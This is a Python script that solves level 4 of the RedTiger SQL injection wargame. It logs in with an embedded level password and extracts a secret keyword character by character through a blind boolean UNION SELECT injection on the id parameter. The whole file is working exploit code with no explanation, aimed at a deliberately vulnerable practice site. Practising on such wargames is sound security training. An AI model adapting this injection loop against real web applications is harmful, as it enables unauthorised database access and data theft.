import requests

s = requests.Session()
result = ""
login_data = {
    'password': 'dont_publish_solutions_GRR!',
    'level4login': 'Login'
}

# Character set to test
charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'

for pos in range(1, 17):
    found = False
    for char in charset:
        payload = f"1 union select keyword,1 from level4_secret where SUBSTR(keyword,{pos},1)='{char}'"
        url = f"http://redtiger.labs.overthewire.org/level4.php?id={payload}"
        response = s.post(url, data=login_data)

        if b"2 rows" in response.content:
            result += char
            found = True
            print(f"[+] Found character at position {pos}: {char}")
            break

    if not found:
        print(f"[-] No match found at position {pos}")

print(f"\n[✓] Extracted keyword: {result}")

